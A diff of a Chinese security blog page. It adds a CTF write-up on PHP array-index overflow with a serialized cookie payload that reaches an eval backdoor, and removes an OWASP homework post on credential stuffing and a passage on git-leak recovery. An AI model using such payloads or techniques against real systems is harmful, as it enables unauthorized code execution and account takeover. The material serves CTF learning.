+      <meta itemprop="description" content="铁马冰河入梦来">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="inanb">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/05/08/%E8%93%9D%E5%B8%BD%E6%9D%AF2021%E5%A4%8D%E7%8E%B0/" class="post-title-link" itemprop="url">蓝帽杯2021复现</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-05-08 17:28:24" itemprop="dateCreated datePublished" datetime="2021-05-08T17:28:24+08:00">2021-05-08</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-05-13 17:01:10" itemprop="dateModified" datetime="2021-05-13T17:01:10+08:00">2021-05-13</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="蓝帽杯2021复现"><a href="#蓝帽杯2021复现" class="headerlink" title="蓝帽杯2021复现"></a>蓝帽杯2021复现</h3><h4 id="one-Pointer-php"><a href="#one-Pointer-php" class="headerlink" title="one_Pointer_php"></a>one_Pointer_php</h4><p>buu上开了环境，真不错</p>
+<p>user.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $count;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>add_api.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;user.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>($user=unserialize($_COOKIE[<span class="string">&quot;data&quot;</span>]))&#123;</span><br><span class="line">	$count[++$user-&gt;count]=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>($count[]=<span class="number">1</span>)&#123;</span><br><span class="line">		$user-&gt;count+=<span class="number">1</span>;</span><br><span class="line">		setcookie(<span class="string">&quot;data&quot;</span>,serialize($user));</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">eval</span>($_GET[<span class="string">&quot;backdoor&quot;</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	$user=<span class="keyword">new</span> User;</span><br><span class="line">	$user-&gt;count=<span class="number">1</span>;</span><br><span class="line">	setcookie(<span class="string">&quot;data&quot;</span>,serialize($user));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>就两个文件……</p>
+<p>当时看了半天，就只知道要绕过<code>if($count[]=1)</code>……可这玩意不是恒对的吗……</p>
+<p>这关系到php的索引数组溢出</p>
+<h5 id="PHP数组"><a href="#PHP数组" class="headerlink" title="PHP数组"></a>PHP数组</h5><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43821278/article/details/114763459">https://blog.csdn.net/weixin_43821278/article/details/114763459</a></p>
+<p>根据这篇文章的实验</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//php 5.59nts</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a[<span class="number">2147483647</span>]=<span class="string">&quot;ccc&quot;</span>;</span><br><span class="line">$a[]=<span class="string">&quot;bbb&quot;</span>;</span><br><span class="line">var_dump($a);</span><br></pre></td></tr></table></figure>
+
+<p>输出：</p>
+<p><img src="D:\HexoBlog\source\images\蓝帽杯2021复现\image-20210508181911478.png" alt="image-20210508181911478"></p>
+<blockquote>
+<p>$a[]访问到的是当前最大数值索引的下一位</p>
+</blockquote>
+<p>也就是说，在5.5.9nts版本下，2147483647就是数值索引的界限，而2147483647正是5.5.9版本中默认设置的整型最大值：<code>PHP_INT_MAX:int(2147483647)</code>。</p>
+<p>这里的int，是<strong>有符号32位二进制可表示的最大数</strong>。</p>
+<blockquote>
+<p><strong>2^31-1</strong>=<strong>2147483647</strong></p>
+</blockquote>
+<p>如果超过了呢？</p>
+<p><img src="/images/%E8%93%9D%E5%B8%BD%E6%9D%AF2021%E5%A4%8D%E7%8E%B0/image-20210513165829865.png" alt="image-20210513165829865"></p>
+<p>这里会转化为范围更大的float储存……</p>
+<p><img src="/images/%E8%93%9D%E5%B8%BD%E6%9D%AF2021%E5%A4%8D%E7%8E%B0/image-20210513165839374.png" alt="image-20210513165839374"></p>
+<p>数组中溢出后就会回滚从int的最小值，于是会符合这样的规律：</p>
+<blockquote>
+<p>0—2147483647                       下标0~2147483647 </p>
+<p>2147483648—4294967296   下标-2147483648~0 </p>
+<p>4294967296—6442450943   下标 0~2147483647</p>
+<p>下一个溢出为0的数字是：8589934592</p>
+</blockquote>
+<p>这样使用似乎没什么问题，但如果是通过<code>$a[]</code>去获取就会产生报错，相关版本的题目是<code>XCTF-favorite_number</code>，可以研究研究。</p>
+<h5 id="较新的版本"><a href="#较新的版本" class="headerlink" title="较新的版本"></a>较新的版本</h5><p>这里是7.3.4nts的php版本</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;PHP_INT_MAX：&quot;</span>;</span><br><span class="line">var_dump(PHP_INT_MAX);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;PHP_INT_MIN：&quot;</span>;</span><br><span class="line">var_dump(PHP_INT_MIN);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;PHP_INT_SIZE：&quot;</span>;</span><br><span class="line">var_dump(PHP_INT_SIZE);</span><br><span class="line"></span><br><span class="line">$a =<span class="number">9223372036854775806</span>;</span><br><span class="line">$b =<span class="number">9223372036854775806</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">var_dump(is_int($a));</span><br><span class="line">$a++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">var_dump(is_int($a));</span><br><span class="line">$a++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="keyword">echo</span> <span class="string">&quot;is_int：&quot;</span>;</span><br><span class="line">var_dump(is_int($a));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="keyword">echo</span> <span class="string">&quot;is_float：&quot;</span>;</span><br><span class="line">var_dump(is_float($a));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line">$b++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line">$b++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">输出：</span><br><span class="line">PHP_INT_MAX：int(9223372036854775807)</span><br><span class="line">PHP_INT_MIN：int(-9223372036854775808)</span><br><span class="line">PHP_INT_SIZE：int(8)</span><br><span class="line">bool(true)</span><br><span class="line">bool(true)</span><br><span class="line">is_int：bool(false)</span><br><span class="line">is_float：bool(true)</span><br><span class="line">9223372036854775806</span><br><span class="line">9223372036854775807</span><br><span class="line">9.2233720368548E+18</span><br></pre></td></tr></table></figure>
+
+<p>同样会转化为float而不再属于整型，并会以科学计数法输出</p>
+<p>这里的“int”，是<strong>有符号64位二进制可表示的最大数</strong>，或者说，我们更加熟悉的<strong>long long int</strong>。</p>
+<blockquote>
+<p><strong>2^63-1</strong>=<strong>9223372036854775807</strong></p>
+</blockquote>
+<p>较新的版本大概是提高了索引溢出的阈值……</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$a[<span class="number">9223372036854775806</span>]=<span class="string">&quot;haha&quot;</span>;</span><br><span class="line"></span><br><span class="line">$a[] =<span class="number">1</span>;</span><br><span class="line">var_dump($a);</span><br><span class="line"></span><br><span class="line">$a[] =<span class="number">1</span>;</span><br><span class="line">var_dump($a);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E8%93%9D%E5%B8%BD%E6%9D%AF2021%E5%A4%8D%E7%8E%B0/image-20210513165907924.png" alt="image-20210513165907924"></p>
+<p>最后的语句成功报错，根据这个方法：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;user.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>($user=unserialize($_COOKIE[<span class="string">&quot;data&quot;</span>]))&#123;</span><br><span class="line">	$count[++$user-&gt;count]=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>($count[]=<span class="number">1</span>)&#123;</span><br><span class="line">		$user-&gt;count+=<span class="number">1</span>;</span><br><span class="line">		setcookie(<span class="string">&quot;data&quot;</span>,serialize($user));</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">eval</span>($_GET[<span class="string">&quot;backdoor&quot;</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	$user=<span class="keyword">new</span> User;</span><br><span class="line">	$user-&gt;count=<span class="number">1</span>;</span><br><span class="line">	setcookie(<span class="string">&quot;data&quot;</span>,serialize($user));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a =<span class="keyword">new</span> User();</span><br><span class="line">$a -&gt;count=<span class="number">9223372036854775806</span>;</span><br><span class="line"></span><br><span class="line">$a =urlencode(serialize($a));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>就可以成功绕过赋值判断</p>
+<blockquote>
+<p>O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22count%22%3Bi%3A9223372036854775806%3B%7D</p>
+</blockquote>
+<p>执行命令，来phpinfo看看敏感信息：</p>
+<p><img src="/images/%E8%93%9D%E5%B8%BD%E6%9D%AF2021%E5%A4%8D%E7%8E%B0/image-20210513165922744.png" alt="image-20210513165922744"></p>
+<p>……上一个绕过<strong>disable_function</strong>的还是so劫持或者蚁剑插件……不是很会……</p>
+<p>看了dalao的wp，一直搞不好……原理倒是看了七七八八……</p>
+<p>然后……没有然后了……蹲一个好大佬的wp😢</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2021/05/06/hacker101-2/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -839,476 +1243,10 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/04/24/hacker101-1/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/header.jpg">
-      <meta itemprop="name" content="inanb">
-      <meta itemprop="description" content="铁马冰河入梦来">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="inanb">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/04/24/hacker101-1/" class="post-title-link" itemprop="url">hacker101.1</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-04-24 14:56:25" itemprop="dateCreated datePublished" datetime="2021-04-24T14:56:25+08:00">2021-04-24</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-05-06 15:39:32" itemprop="dateModified" datetime="2021-05-06T15:39:32+08:00">2021-05-06</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h5 id="hacker101-1"><a href="#hacker101-1" class="headerlink" title="hacker101.1"></a>hacker101.1</h5><p>2.观看视频二，回答下列问题：</p>
-<p>视频二：<a target="_blank" rel="noopener" href="https://www.hacker101.com/sessions/pentest_owasp">https://www.hacker101.com/sessions/pentest_owasp</a> </p>
-<p>1.目前owasp的十大web安全漏洞是哪些？这些漏洞排名是按照漏洞的严重程度排序的还是按照漏洞的常见程度排序的？（2分） </p>
-<blockquote>
-<p><a target="_blank" rel="noopener" href="https://wiki.owasp.org/images/d/dc/OWASP_Top_10_2017_%E4%B8%AD%E6%96%87%E7%89%88v1.3.pdf">中文PDF-2017</a></p>
-<ol>
-<li><p><strong>注入漏洞：</strong><a target="_blank" rel="noopener" href="https://www.immuniweb.com/resources/owasp-top-ten/#Injection">Injection</a></p>
-</li>
-<li><p><strong>身份认证失效：</strong><a target="_blank" rel="noopener" href="https://www.immuniweb.com/resources/owasp-top-ten/#Authentication">Broken Authentication</a></p>
-</li>
-<li><p><strong>敏感数据泄露：</strong><a target="_blank" rel="noopener" href="https://www.immuniweb.com/resources/owasp-top-ten/#Data">Sensitive Data Exposure</a></p>
-</li>
-<li><p><strong>XML外部实体漏洞：</strong><a target="_blank" rel="noopener" href="https://www.immuniweb.com/resources/owasp-top-ten/#XML">XML External Entities (XXE)</a></p>
-</li>
-<li><p><strong>访问控制失效：</strong><a target="_blank" rel="noopener" href="https://www.immuniweb.com/resources/owasp-top-ten/#Access">Broken Access Control</a></p>
-</li>
-<li><p><strong>安全配置错误：</strong><a target="_blank" rel="noopener" href="https://www.immuniweb.com/resources/owasp-top-ten/#Misconfigurations">Security Misconfigurations</a></p>
-</li>
-<li><p><strong>跨站脚本攻击：</strong><a target="_blank" rel="noopener" href="https://www.immuniweb.com/resources/owasp-top-ten/#XSS">Cross-Site Scripting (XSS)</a></p>
-</li>
-<li><p><strong>不安全的反序列化：</strong><a target="_blank" rel="noopener" href="https://www.immuniweb.com/resources/owasp-top-ten/#Deserialization">Insecure Deserialization</a></p>
-</li>
-<li><p><strong>使用含有已知漏洞的组件：</strong><a target="_blank" rel="noopener" href="https://www.immuniweb.com/resources/owasp-top-ten/#Vulnerabilities">Using Components with Known Vulnerabilities</a></p>
-</li>
-<li><p><strong>日志和监控不足：</strong><a target="_blank" rel="noopener" href="https://www.immuniweb.com/resources/owasp-top-ten/#Insufficient">Insufficient Logging and Monitoring</a></p>
-<p><strong><em>OWASP Top 10 is a ranking of the ten most dangerous information security risks for web applications, compiled by a community of industry experts. For each point of the rating, the risk is calculated by experts based on the<a target="_blank" rel="noopener" href="https://owasp.org/www-project-risk-assessment-framework/">OWASP Risk Rating Methodology</a>and includes an assessment of Weakness Prevalence, Weakness Detectability and Exploitability, as well as the criticality of the consequences of their operation or Technical Impacts.</em></strong></p>
-<p><strong>前10大风险项是根据流行数据选择和优先排序，并结合了对可利用性、可检测性和影响程度的一致性评估而形成。</strong></p>
-</li>
-</ol>
-</blockquote>
-<p>2.请翻译一下credential stuffing（1分） </p>
-<blockquote>
-<p>​    <strong><em>one that’s really common from a pentesting perspective is what we call credential stuffing. And say that we go out we grab data from breached data that’s out there so an account that’s been compromised the list shows up on the internet and now, the hackers have access to usernames and passwords and say we are testing in some website.</em></strong></p>
-<p>​    <strong><em>we just send usernames and passwords to an application ,and there’s no threat detection we’re just able to pound a login form or even use something like password spraying where we just take something like spring 2019 or summer 2020 exclamation and just throw common credentials out there and see if it sticks if we’re able to continuously brute force  an application without anything preventing us or any account lockouts.</em></strong></p>
-<p>emm，实际上就是撞库吗……</p>
-<p>利用已泄露的账户信息在多个平台进行尝试，这种尝试很难被检测出来。不同的用户名与密码，甚至于手机号，身份证号等等敏感信息进行组合来尝试登录。可能用户在多个平台的账户与密码是相同的，这样就十分危险。</p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44549063/article/details/113518965"><strong>Credential Stuffing Attack</strong></a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/still_night/article/details/104837926">Beyond credential stuffing</a></p>
-</blockquote>
-<p>3.为什么说不充分的日志记录(insufficient logging)也算owasp十大漏洞的一种？他的危害性如何（2分） </p>
-<blockquote>
-<p> 之所以有很多入侵行为发生，其中原因之一是没有行为监管，或监管不充分。入侵者r进入系统然而没有日志记录这一行为，或日志记录不充分。</p>
-<p>所以，在做一些项目时，检查日志与监控是十分重要的。不充分的日志记录与监管可能会导致很多入侵行为的发生。</p>
-</blockquote>
-<p>4.请翻阅一下owasp testing guide，以及owasp testing guide check-list，视频说怎么结合这两个文档来学习渗透测试？ 结合你平时渗透过程中的经验，谈谈你的感想。（3分） </p>
-<blockquote>
-<p><a target="_blank" rel="noopener" href="https://kennel209.gitbooks.io/owasp-testing-guide-v4/content/zh/frontispiece/index.html">中文版testing-guide</a></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/tanprathan/OWASP-Testing-Checklist">https://github.com/tanprathan/OWASP-Testing-Checklist</a></p>
-<p>从testing guide中，我们可以了解到所有的不同的渗透测试一个网站应用的方法。check-list可以提供我们在测试中所有要检查的点，并为这些点提供测试工具。check-list中的测试点可拿到testing guide中检索得到更为详尽的信息与总结，search engine、operator……and step by step。</p>
-<p>emmm，速查与教科书的关系……？渗透测试是开卷的，速查与教科书就显得十分重要……                                                                                                                               我们需要清楚应用工作的方式，熟悉测试的逻辑，而check-list和testing-guide负责帮助我们理顺逻辑并记忆基础测试点。</p>
-<p>从思考与逻辑出发，最终落实到check-list and testing-guide。check-list and testing-guide帮助我们查漏补缺。</p>
-</blockquote>
-<ol start="5">
-<li>you are only as good as you notes   you are only as good as things you can refer to结合这两句话谈谈你的感想。（2分）</li>
-</ol>
-<blockquote>
-<p>挺好……owasp提供了很好的资源，各种test-guiding，hacker101也提供了很好的学习资源（包括英语……</p>
-<p>写博客这么长时间，感觉也确实有用。包括资料查找、记录payload、各种知识点……我们所记录的、可参考的东西是记忆可靠的延伸。</p>
-</blockquote>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/04/24/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/header.jpg">
-      <meta itemprop="name" content="inanb">
-      <meta itemprop="description" content="铁马冰河入梦来">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="inanb">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/04/24/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/" class="post-title-link" itemprop="url">网鼎杯-2018-Comment</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-04-24 14:56:25" itemprop="dateCreated datePublished" datetime="2021-04-24T14:56:25+08:00">2021-04-24</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-04-25 20:45:34" itemprop="dateModified" datetime="2021-04-25T20:45:34+08:00">2021-04-25</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="网鼎杯-2018-Comment"><a href="#网鼎杯-2018-Comment" class="headerlink" title="[网鼎杯 2018]Comment"></a>[网鼎杯 2018]Comment</h3><p>学习了不少知识…………</p>
-<p>进入题目是一个留言板，留言需要登录，先不管……发现存在git泄露，上githack：</p>
-<p>write_do：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;mysql.php&quot;</span>;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;login&#x27;</span>] != <span class="string">&#x27;yes&#x27;</span>)&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ./login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;do&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> ($_GET[<span class="string">&#x27;do&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;write&#x27;</span>:</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;comment&#x27;</span>:</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>关键这玩意没啥用啊……学习一波git恢复</p>
-<blockquote>
-<p>gitExtract工具似乎会自动恢复泄露文件……回去试试……</p>
-</blockquote>
-<h4 id="git恢复"><a href="#git恢复" class="headerlink" title="git恢复"></a>git恢复</h4><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/iamstudy/articles/wangding_4th_game_web_writeup.html">https://www.cnblogs.com/iamstudy/articles/wangding_4th_game_web_writeup.html</a></p>
-<p><a href="%5Bhttps://blog.csdn.net/edric1261234/article/details/82796506?utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control&dist_request_id=1332041.9234.16192377503140215&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control%5D(https://blog.csdn.net/edric1261234/article/details/82796506?utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control&dist_request_id=1332041.9234.16192377503140215&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control)">git reset 使用及回滚</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000/0013745374151782eb658c5a5ca454eaa451661275886c6000">git的工作区和暂存区</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/jjlovefj/article/details/86476925">git log 详解</a></p>
-<img src="/images/网鼎杯-2018-Comment/image-20210425204527594.png" alt="image-20210425204527594" style="zoom:80%;" />
-
-<blockquote>
-<p>提交一个文件的时候是分为<code>git add</code>、<code>git commit</code>两步的<br>当<code>git add</code>的时候，是把文件临时放在临时区stage中<br>当<code>git commit</code>的时候，是把临时区stage的所有内容提交到当前分支<br>当然这两个在objects目录都会生成一个对象文件，来存储数据。</p>
-<p>我们使用 git add 命令将内容写入暂存区。                                                                                                                   git commit 命令会将暂存区内容添加到本地仓库中</p>
-</blockquote>
-<p>这里要结合GitHacker使用，githacker似乎在获取泄露文件上能够获取到更详尽的信息。</p>
-<blockquote>
-<p>个人体验：GitHacker要在linux上用，需要python的requests……</p>
-</blockquote>
-<p>这里我们通过：git log查看commit history：</p>
-<img src="/images/网鼎杯-2018-Comment/image-20210424151445916.png" alt="image-20210424151445916" style="zoom:80%;" />
-
-<p>git reset回滚未commit版本前已经commit的网页源代码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;mysql.php&quot;</span>;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span 